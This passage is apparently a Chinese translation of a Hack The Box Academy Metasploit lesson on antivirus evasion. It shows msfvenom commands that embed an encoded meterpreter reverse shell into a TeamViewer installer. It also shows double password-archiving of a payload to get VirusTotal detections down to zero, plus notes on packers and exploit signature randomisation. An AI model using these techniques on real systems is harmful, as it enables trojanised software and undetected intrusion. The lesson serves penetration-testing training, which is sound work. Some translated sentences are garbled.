渗漏技术用于缓慢地将数据从网络中吸出并进入黑客的域，几个月都不会被注意到。要了解有关此攻击的更多信息，请访问以下链接：</p><ul><li><a href="https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/">美国政府关于 Equifax 黑客攻击的事后分析报告</a></li><li><a href="https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411">防止 DNS 渗漏</a></li><li><a href="https://www.infoblox.com/wp-content/uploads/infoblox-whitepaper-stopping-data-exfiltration-and-malware-spread-through-dns.pdf">阻止数据泄露和恶意软件通过 DNS 传播</a></li></ul><p>回到 msfconsole，它现在支持 AES 加密隧道的能力，加上 Meterpreter 在内存中运行的特性，大大提高了我们的能力。然而，我们仍然有一个问题，即有效载荷一旦到达目的地，在运行并放入内存之前会发生什么。可以对该文件的签名进行指纹识别，与数据库进行匹配，并阻止我们访问目标的机会。我们还可以确定，AV 软件开发人员正在研究 msfconsole 模块和功能，以将生成的代码和文件添加到他们的签名数据库中，从而导致大多数（如果不是全部）默认有效负载立即被 AV 软件关闭。</p><p>我们很幸运，因为<code>msfvenom</code>提供了使用可执行模板的选项。这允许我们为可执行文件使用一些预设模板，将我们的有效载荷注入其中（没有双关语意），并使用<code>any</code>可执行文件作为我们可以发起攻击的平台。我们可以将 shellcode 嵌入到我们手边的任何安装程序、软件包或程序中，将有效负载 shellcode 隐藏在实际产品的合法代码深处。这极大地混淆了我们的恶意代码，更重要的是，降低了我们被检测到的机会。实际的、合法的可执行文件、我们不同的编码方案（及其迭代）和我们不同的有效负载 shellcode 变体之间有许多有效组合。这会生成所谓的后门可执行文件。</p><p>查看下面的代码片段，了解 msfvenom 如何将有效载荷嵌入到任何可执行文件中：</p><p> 周界保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5</span><br><span class="line"></span><br><span class="line">Attempting to read payload from STDIN...</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 5 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 27 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 54 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 81 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 108 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 135 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 135</span><br><span class="line">Payload size: 135 bytes</span><br><span class="line">Saved as: /home/user/Desktop/TeamViewer_Setup.exe</span><br></pre></td></tr></table></figure><p> 周界保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes</span><br></pre></td></tr></table></figure><p>大多数情况下，当目标启动后门可执行文件时，似乎什么也不会发生，这在某些情况下会引起怀疑。为了提高我们的机会，我们需要触发已启动应用程序的正常执行的继续，同时将有效负载从主应用程序拉到一个单独的线程中。我们使用<code>-k</code>上面显示的标志来执行此操作。然而，即使<code>-k</code>标志正在运行，如果目标从 CLI 环境启动后门可执行模板，他们只会注意到正在运行的后门。如果他们这样做，将弹出一个单独的窗口，其中包含有效载荷，直到我们在目标上完成运行有效载荷会话交互后，该窗口才会关闭。</p><hr><h2 id="档案"><a href="#档案" class="headerlink" title="档案"></a>档案</h2><p>存档文件、文件夹、脚本、可执行文件、图片或文档等信息并在存档上放置密码可绕过当今许多常见的反病毒签名。但是，此过程的缺点是它们将作为通知在 AV 警报仪表板中提出，因为由于被密码锁定而无法扫描。管理员可以选择手动检查这些档案以确定它们是否是恶意的。</p><h4 id="生成有效载荷-1"><a href="#生成有效载荷-1" class="headerlink" title="生成有效载荷"></a>生成有效载荷</h4><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5</span><br><span class="line"></span><br><span class="line">Attempting to read payload from STDIN...</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 5 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 27 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 54 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 81 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 108 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 135 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 135</span><br><span class="line">Payload size: 135 bytes</span><br><span class="line">Saved as: /home/user/test.js</span><br></pre></td></tr></table></figure><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cat test.js</span><br><span class="line"></span><br><span class="line">�+n&quot;����t$�G4ɱ1zz��j�V6����ic��o�Bs&gt;��Z*�����9vt��%��1�</span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��</span><br></pre></td></tr></table></figure><p>如果我们检查 VirusTotal 以从我们生成的有效负载中获取检测基线，结果将如下所示。</p><h4 id="病毒总数"><a href="#病毒总数" class="headerlink" title="病毒总数"></a>病毒总数</h4><p> 病毒总数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f test.js </span><br><span class="line"></span><br><span class="line">[*] WARNING: When you upload or otherwise submit content, you give VirusTotal</span><br><span class="line">[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable</span><br><span class="line">[*] licence to use, edit, host, store, reproduce, modify, create derivative works,</span><br><span class="line">[*] communicate, publish, publicly perform, publicly display and distribute such</span><br><span class="line">[*] content. To read the complete Terms of Service for VirusTotal, please go to the</span><br><span class="line">[*] following link:</span><br><span class="line">[*] https://www.virustotal.com/en/about/terms-of-service/</span><br><span class="line">[*] </span><br><span class="line">[*] If you prefer your own API key, you may obtain one at VirusTotal.</span><br><span class="line"></span><br><span class="line">[*] Enter &#x27;Y&#x27; to acknowledge: Y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload test.js...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a</span><br><span class="line">[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309</span><br><span class="line">[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1652167047</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code 0. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: test.js (11 / 59): &lt;...SNIP...&gt;</span><br><span class="line">====================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version               Result                             Update</span><br><span class="line"> ---------             --------  -------               ------                             ------</span><br><span class="line"> ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510</span><br><span class="line"> Acronis               false     1.2.0.108                                                20220426</span><br><span class="line"> Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> AhnLab-V3             false     3.21.3.10230                                             20220510</span><br><span class="line"> Antiy-AVL             false     3.0                                                      20220510</span><br><span class="line"> Arcabit               false     1.0.0.889                                                20220510</span><br><span class="line"> Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510</span><br><span class="line"> Avira                 false     8.3.3.14                                                 20220510</span><br><span class="line"> Baidu                 false     1.0.0.2                                                  20190318</span><br><span class="line"> BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> BitDefenderTheta      false     7.2.37796.0                                              20220428</span><br><span class="line"> Bkav                  false     1.3.0.9899                                               20220509</span><br><span class="line"> CAT-QuickHeal         false     14.00                                                    20220510</span><br><span class="line"> CMC                   false     2.10.2019.1                                              20211026</span><br><span class="line"> ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509</span><br><span class="line"> Comodo                false     34607                                                    20220510</span><br><span class="line"> Cynet                 false     4.0.0.27                                                 20220510</span><br><span class="line"> Cyren                 false     6.5.1.2                                                  20220510</span><br><span class="line"> DrWeb                 false     7.0.56.4040                                              20220510</span><br><span class="line"> ESET-NOD32            false     25243                                                    20220510</span><br><span class="line"> Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510</span><br><span class="line"> F-Secure              false     18.10.978.51                                             20220510</span><br><span class="line"> FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Fortinet              false     6.2.142.0                                                20220510</span><br><span class="line"> GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Gridinsoft            false     1.0.77.174                                               20220510</span><br><span class="line"> Ikarus                false     6.0.24.0                                                 20220509</span><br><span class="line"> Jiangmin              false     16.0.100                                                 20220509</span><br><span class="line"> K7AntiVirus           false     12.12.42275                                              20220510</span><br><span class="line"> K7GW                  false     12.12.42275                                              20220510</span><br><span class="line"> Kaspersky             false     21.0.1.45                                                20220510</span><br><span class="line"> Kingsoft              false     2017.9.26.565                                            20220510</span><br><span class="line"> Lionic                false     7.5                                                      20220510</span><br><span class="line"> MAX                   true      2019.9.16.1           malware (ai score=89)              20220510</span><br><span class="line"> Malwarebytes          false     4.2.2.27                                                 20220510</span><br><span class="line"> MaxSecure             false     1.0.0.1                                                  20220510</span><br><span class="line"> McAfee                false     6.0.6.653                                                20220510</span><br><span class="line"> McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510</span><br><span class="line"> MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Microsoft             false     1.1.19200.5                                              20220510</span><br><span class="line"> NANO-Antivirus        false     1.0.146.25588                                            20220510</span><br><span class="line"> Panda                 false     4.6.4.2                                                  20220509</span><br><span class="line"> Rising                false     25.0.0.27                                                20220510</span><br><span class="line"> SUPERAntiSpyware      false     5.6.0.1032                                               20220507</span><br><span class="line"> Sangfor               false     2.14.0.0                                                 20220507</span><br><span class="line"> Sophos                false     1.4.1.0                                                  20220510</span><br><span class="line"> Symantec              false     1.17.0.0                                                 20220510</span><br><span class="line"> TACHYON               false     2022-05-10.02                                            20220510</span><br><span class="line"> Tencent               false     1.0.0.1                                                  20220510</span><br><span class="line"> TrendMicro            false     11.0.0.1006                                              20220510</span><br><span class="line"> TrendMicro-HouseCall  false     10.0.0.1040                                              20220510</span><br><span class="line"> VBA32                 false     5.0.0                                                    20220506</span><br><span class="line"> ViRobot               false     2014.3.20.0                                              20220510</span><br><span class="line"> VirIT                 false     9.5.191                                                  20220509</span><br><span class="line"> Yandex                false     5.5.2.24                                                 20220428</span><br><span class="line"> Zillya                false     2.0.0.4627                                               20220509</span><br><span class="line"> ZoneAlarm             false     1.0                                                      20220510</span><br><span class="line"> Zoner                 false     2.2.2.0                                                  20220509</span><br></pre></td></tr></table></figure><p>现在，尝试将其存档两次，在创建时为两个存档都设置密码，并从它们的名称中删除<code>.rar</code>&#x2F; <code>.zip</code>&#x2F;<code>.7z</code>扩展名。为此，我们可以从 RARLabs 安装<a href="https://www.rarlab.com/download.htm">RAR 实用程序</a>，它的工作方式与 Windows 上的 WinRAR 完全一样。</p><h4 id="存档有效负载"><a href="#存档有效负载" class="headerlink" title="存档有效负载"></a>存档有效负载</h4><p> 存档有效负载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz</span><br><span class="line">vnswer77@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz &amp;&amp; cd rar</span><br><span class="line">vnswer77@htb[/htb]$ rar a ~/test.rar -p ~/test.js</span><br><span class="line"></span><br><span class="line">Enter password (will not be echoed): ******</span><br><span class="line">Reenter password: ******</span><br><span class="line"></span><br><span class="line">RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017</span><br><span class="line">Trial version             Type &#x27;rar -?&#x27; for help</span><br><span class="line">Evaluation copy. Please register.</span><br><span class="line"></span><br><span class="line">Creating archive test.rar</span><br><span class="line">Adding    test.js                                                     OK </span><br><span class="line">Done</span><br></pre></td></tr></table></figure><p> 存档有效负载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test.js   test.rar</span><br></pre></td></tr></table></figure><h4 id="删除-RAR-扩展名"><a href="#删除-RAR-扩展名" class="headerlink" title="删除 .RAR 扩展名"></a>删除 .RAR 扩展名</h4><p> 删除 .RAR 扩展名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ mv test.rar test</span><br><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test   test.js</span><br></pre></td></tr></table></figure><h4 id="再次归档有效负载"><a href="#再次归档有效负载" class="headerlink" title="再次归档有效负载"></a>再次归档有效负载</h4><p> 再次归档有效负载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ rar a test2.rar -p test</span><br><span class="line"></span><br><span class="line">Enter password (will not be echoed): ******</span><br><span class="line">Reenter password: ******</span><br><span class="line"></span><br><span class="line">RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017</span><br><span class="line">Trial version             Type &#x27;rar -?&#x27; for help</span><br><span class="line">Evaluation copy. Please register.</span><br><span class="line"></span><br><span class="line">Creating archive test2.rar</span><br><span class="line">Adding    test                                                        OK </span><br><span class="line">Done</span><br></pre></td></tr></table></figure><h4 id="删除-RAR-扩展名-1"><a href="#删除-RAR-扩展名-1" class="headerlink" title="删除 .RAR 扩展名"></a>删除 .RAR 扩展名</h4><p> 删除 .RAR 扩展名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ mv test2.rar test2</span><br><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test   test2   test.js</span><br></pre></td></tr></table></figure><p>test2 文件是最终的 .rar 存档文件，其扩展名 (.rar) 从名称中删除。之后，我们可以继续将其上传到 VirusTotal 以进行另一次检查。</p><h4 id="病毒总数-1"><a href="#病毒总数-1" class="headerlink" title="病毒总数"></a>病毒总数</h4><p> 病毒总数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f test2</span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload test2...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d</span><br><span class="line">[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429</span><br><span class="line">[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1652167804</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code 0. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad</span><br><span class="line">=================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version         Result  Update</span><br><span class="line"> ---------             --------  -------         ------  ------</span><br><span class="line"> ALYac                 false     1.1.3.1                 20220510</span><br><span class="line"> Acronis               false     1.2.0.108               20220426</span><br><span class="line"> Ad-Aware              false     3.0.21.193              20220510</span><br><span class="line"> AhnLab-V3             false     3.21.3.10230            20220510</span><br><span class="line"> Antiy-AVL             false     3.0                     20220510</span><br><span class="line"> Arcabit               false     1.0.0.889               20220510</span><br><span class="line"> Avira                 false     8.3.3.14                20220510</span><br><span class="line"> BitDefender           false     7.2                     20220510</span><br><span class="line"> BitDefenderTheta      false     7.2.37796.0             20220428</span><br><span class="line"> Bkav                  false     1.3.0.9899              20220509</span><br><span class="line"> CAT-QuickHeal         false     14.00                   20220510</span><br><span class="line"> CMC                   false     2.10.2019.1             20211026</span><br><span class="line"> ClamAV                false     0.105.0.0               20220509</span><br><span class="line"> Comodo                false     34606                   20220509</span><br><span class="line"> Cynet                 false     4.0.0.27                20220510</span><br><span class="line"> Cyren                 false     6.5.1.2                 20220510</span><br><span class="line"> DrWeb                 false     7.0.56.4040             20220510</span><br><span class="line"> ESET-NOD32            false     25243                   20220510</span><br><span class="line"> Emsisoft              false     2021.5.0.7597           20220510</span><br><span class="line"> F-Secure              false     18.10.978.51            20220510</span><br><span class="line"> FireEye               false     35.24.1.0               20220510</span><br><span class="line"> Fortinet              false     6.2.142.0               20220510</span><br><span class="line"> Gridinsoft            false     1.0.77.174              20220510</span><br><span class="line"> Jiangmin              false     16.0.100                20220509</span><br><span class="line"> K7AntiVirus           false     12.12.42275             20220510</span><br><span class="line"> K7GW                  false     12.12.42275             20220510</span><br><span class="line"> Kingsoft              false     2017.9.26.565           20220510</span><br><span class="line"> Lionic                false     7.5                     20220510</span><br><span class="line"> MAX                   false     2019.9.16.1             20220510</span><br><span class="line"> Malwarebytes          false     4.2.2.27                20220510</span><br><span class="line"> MaxSecure             false     1.0.0.1                 20220510</span><br><span class="line"> McAfee-GW-Edition     false     v2019.1.2+3728          20220510</span><br><span class="line"> MicroWorld-eScan      false     14.0.409.0              20220510</span><br><span class="line"> NANO-Antivirus        false     1.0.146.25588           20220510</span><br><span class="line"> Panda                 false     4.6.4.2                 20220509</span><br><span class="line"> Rising                false     25.0.0.27               20220510</span><br><span class="line"> SUPERAntiSpyware      false     5.6.0.1032              20220507</span><br><span class="line"> Sangfor               false     2.14.0.0                20220507</span><br><span class="line"> Symantec              false     1.17.0.0                20220510</span><br><span class="line"> TACHYON               false     2022-05-10.02           20220510</span><br><span class="line"> Tencent               false     1.0.0.1                 20220510</span><br><span class="line"> TrendMicro-HouseCall  false     10.0.0.1040             20220510</span><br><span class="line"> VBA32                 false     5.0.0                   20220506</span><br><span class="line"> ViRobot               false     2014.3.20.0             20220510</span><br><span class="line"> VirIT                 false     9.5.191                 20220509</span><br><span class="line"> Yandex                false     5.5.2.24                20220428</span><br><span class="line"> Zillya                false     2.0.0.4627              20220509</span><br><span class="line"> ZoneAlarm             false     1.0                     20220510</span><br><span class="line"> Zoner                 false     2.2.2.0                 20220509</span><br></pre></td></tr></table></figure><p><code>to</code>正如我们从上面看到的那样，这是一种在目标主机和目标主机之间传输数据的好方法<code>from</code>。</p><hr><h2 id="包装工"><a href="#包装工" class="headerlink" title="包装工"></a>包装工</h2><p>该术语指的是有效负载与可执行程序和解压缩代码一起打包在一个文件中的过程<code>Packer</code>的结果。<code>executable compression</code>运行时，解压缩代码将后门可执行文件返回到其原始状态，从而为目标主机上的文件扫描机制提供另一层保护。此过程透明地发生，以便压缩的可执行文件以与原始可执行文件相同的方式运行，同时保留所有原始功能。此外，msfvenom 还提供压缩和更改后门可执行文件的文件结构以及加密底层进程结构的能力。</p><p>流行的加壳软件列表：</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><a href="https://upx.github.io/">UPX封隔器</a></td><td><a href="https://enigmaprotector.com/">谜保护者</a></td><td><a href="https://www.matcode.com/mpress.htm">国会议员</a></td></tr><tr><td>备用 EXE 打包程序</td><td>执行隐身</td><td>吗啡</td></tr><tr><td>水电部</td><td>泰米达</td><td></td></tr></tbody></table><p>如果我们想了解有关打包器的更多信息，请查看<a href="https://jon.oberheide.org/files/woot09-polypack.pdf">PolyPack 项目</a>。</p><hr><h2 id="利用编码"><a href="#利用编码" class="headerlink" title="利用编码"></a>利用编码</h2><p>在编写我们的漏洞利用程序或将预先存在的漏洞利用程序移植到框架时，最好确保利用目标系统上实施的安全措施不容易识别漏洞利用代码。</p><p>例如，<code>Buffer Overflow</code>由于其十六进制缓冲区模式，典型的漏洞可能很容易与通过网络传输的常规流量区分开来。IDS &#x2F; IPS 部署可以检查流向目标机器的流量，并注意到用于利用代码的特定过度使用模式。</p><p>在组装我们的漏洞利用代码时，随机化有助于为这些模式添加一些变化，这将破坏众所周知的漏洞利用缓冲区的 IPS &#x2F; IDS 数据库签名。<code>Offset</code>这可以通过在 msfconsole 模块的代码中输入一个开关来完成：</p><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;Targets&#x27;</span> =&gt;</span><br><span class="line">[</span><br><span class="line"> [ <span class="string">&#x27;Windows 2000 SP4 English&#x27;</span>, &#123; <span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x77e14c29</span>, <span class="string">&#x27;Offset&#x27;</span> =&gt; <span class="number">5093</span> &#125; ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>除了 BoF 代码之外，应该始终避免使用明显的 NOP sled，在溢出完成后 shellcode 应该着陆的地方。请注意，BoF 代码的目的是使目标机器上运行的服务崩溃，而 NOP sled 是插入我们的 shellcode（有效负载）的分配内存。IPS&#x2F;IDS 实体会定期检查这两者，因此最好在将我们的自定义漏洞代码部署到客户端网络之前针对沙箱环境测试它。当然，我们可能只有一次机会在评估期间正确地做到这一点。</p><p>有关利用代码的更多信息，我们建议您查看No Starch 出版社的<a href="https://nostarch.com/metasploit">Metasploit - 渗透测试指南。</a>他们深入研究了有关为框架创建漏洞的一些细节。</p><hr><h2 id="从源代码重新编译-Meterpreter"><a href="#从源代码重新编译-Meterpreter" class="headerlink" title="从源代码重新编译 Meterpreter"></a>从源代码重新编译 Meterpreter</h2><p>入侵防御系统和防病毒引擎是最常见的防御工具，可以击落目标的初始立足点。这些主要作用于整个恶意文件或存根阶段的签名。</p><hr><h2 id="关于逃避的注意事项"><a href="#关于逃避的注意事项" class="headerlink" title="关于逃避的注意事项"></a>关于逃避的注意事项</h2><p>本节涵盖高级别的规避。请留意后面的模块，这些模块将更深入地挖掘更有效地执行规避所需的理论和实践知识。值得在较旧的 HTB 机器上尝试其中的一些技术，或者安装带有较旧版本的 Windows Defender 或免费 AV 引擎的 VM，并练习规避技巧。这是一个庞大的主题，无法在单个部分中充分涵盖。</p><p><a href="https://academy.hackthebox.com/module/39/section/418">以前的</a>标记完成和下一步<a href="https://academy.hackthebox.com/module/39/section/493">下一个</a></p><p>备忘单</p><h5 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h5><h6 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h6><p><a href="https://academy.hackthebox.com/module/39/section/381">前言</a><a href="https://academy.hackthebox.com/module/39/section/383">Metasploit简介</a><a href="https://academy.hackthebox.com/module/39/section/384">MSF控制台介绍</a></p><h6 id="MSF-组件"><a href="#MSF-组件" class="headerlink" title="MSF 组件"></a>MSF 组件</h6><p><a 